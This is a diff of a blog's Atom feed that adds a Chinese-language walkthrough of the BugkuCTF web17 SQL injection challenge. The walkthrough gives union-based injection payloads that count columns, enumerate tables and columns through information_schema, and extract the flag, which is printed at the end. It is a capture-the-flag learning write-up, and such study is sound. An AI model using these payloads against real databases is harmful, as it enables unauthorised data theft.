@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-05-19T10:22:08.288Z</updated>
+  <updated>2021-05-19T11:08:56.184Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -21,16 +21,17 @@
     <link href="http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
     <id>http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
     <published>2021-05-19T10:15:33.261Z</published>
-    <updated>2021-05-19T10:22:08.288Z</updated>
+    <updated>2021-05-19T11:08:56.184Z</updated>
     
-    <content type="html"><![CDATA[<p>title: 关于SQL注入<br>author: A.bin<br>cover: /img/9.jpg<br>top_img: /img/10.jpg<br>tags:</p><ul><li>‘-Linux’<br>categories:<br>date: 2021-04-22 18:50:00</li></ul><h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1>]]></content>
+    <content type="html"><![CDATA[<p>title: 关于SQL注入<br>author: A.bin<br>cover: /img/22.jpg<br>top_img: /img/23.jpg<br>tags:</p><ul><li><p>‘-Linux’</p><p>categories:<br>date: 2021-04-22 18:50:00</p></li></ul><h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1><p>先随便输入数字试试 输入1发现有回显</p><p>![14](C:\Users\Pro 13\blog\themes\butterfly\source\img\14.png)</p><p>根据传参可判断这是POST方式，测试一下是不是为sql注入，输入id=1后回显正常</p><p>加入单引号后发现回显不正常，判断为sql注入![15](C:\Users\Pro 13\blog\themes\butterfly\source\img\15.png)</p><p>接下来用order by 语句判断列数</p><p>![16](C:\Users\Pro 13\blog\themes\butterfly\source\img\16.png)</p><p>从4开始吧，构造id=1’ order by 4#，正常回显</p><p>当构造id=1’ order by 5#时，发现回显不正常</p><p>![17](C:\Users\Pro 13\blog\themes\butterfly\source\img\17.jpg)</p><p>由此判断有4列</p><h3 id="之后尝试联合注入，需要把查询数据置空"><a href="#之后尝试联合注入，需要把查询数据置空" class="headerlink" title="之后尝试联合注入，需要把查询数据置空"></a>之后尝试联合注入，需要把查询数据置空</h3><blockquote><p>具体做法是：<strong>id=0’ union select 1,2,3,4#</strong></p></blockquote><h3 id="下面就猜测数据库的表名，版本信息，数据库用户"><a href="#下面就猜测数据库的表名，版本信息，数据库用户" class="headerlink" title="下面就猜测数据库的表名，版本信息，数据库用户"></a>下面就猜测数据库的表名，版本信息，数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips： 没有顺序可言，因为第一个列是成绩单的姓名，所以我们可以把它设为null</span><br></pre></td></tr></table></figure><p>![18](C:\Users\Pro 13\blog\themes\butterfly\source\img\18.png)</p><h3 id="根据数据库skctf-flag去查询表名"><a href="#根据数据库skctf-flag去查询表名" class="headerlink" title="根据数据库skctf_flag去查询表名"></a>根据数据库skctf_flag去查询表名</h3><p>我们可以构造这么一个pyload，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39; union select null,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),user(),version()#</span><br></pre></td></tr></table></figure><p>大致意思就是将第二个列显示出它所有的表名</p><blockquote><p>###这个**select group_concat(table_name) from information_schema.tables where table_schema=database() **可以暂且把它当作一个用来查询表名的固定格式</p></blockquote><p>![19](C:\Users\Pro 13\blog\themes\butterfly\source\img\19.png)</p><p>我们得到了fl4g，可知flag在fl4g的表中，那么下一步我们需要做的就是查询此表中的字段名</p><p>构造pyload</p><blockquote><p>id=0’ union select null,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()#</p></blockquote><p>注意！！</p><p>这里fl4g是一个表，所以需要加单引号</p><p>![20](C:\Users\Pro 13\blog\themes\butterfly\source\img\20.png)</p><p>我们得到了 skctf_flag 字段 可知flag在这里了（皆大欢喜）</p><p>接下来就很简单了 直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select skctf_flag from fl4g</span><br></pre></td></tr></table></figure><p>可得 pyload</p><blockquote><p>id=0’ union select null,(select skctf_flag from fl4g),user(),version()#</p></blockquote><p>![21](C:\Users\Pro 13\blog\themes\butterfly\source\img\21.png)</p><p> 可得flag{aaab401ce593c5d4334e8c565a91b82e}</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;title: 关于SQL注入&lt;br&gt;author: A.bin&lt;br&gt;cover: /img/9.jpg&lt;br&gt;top_img: /img/10.jpg&lt;br&gt;tags:&lt;/p&gt;
+    <summary type="html">&lt;p&gt;title: 关于SQL注入&lt;br&gt;author: A.bin&lt;br&gt;cover: /img/22.jpg&lt;br&gt;top_img: /img/23.jpg&lt;br&gt;tags:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;‘-Linux’&lt;br&gt;categories:&lt;br&gt;date: 2021-</summary>
+&lt;li&gt;&lt;p&gt;‘-Linux’&lt;/p&gt;
+&lt;p&gt;categories:&lt;br&gt;dat</summary>
       
     
     
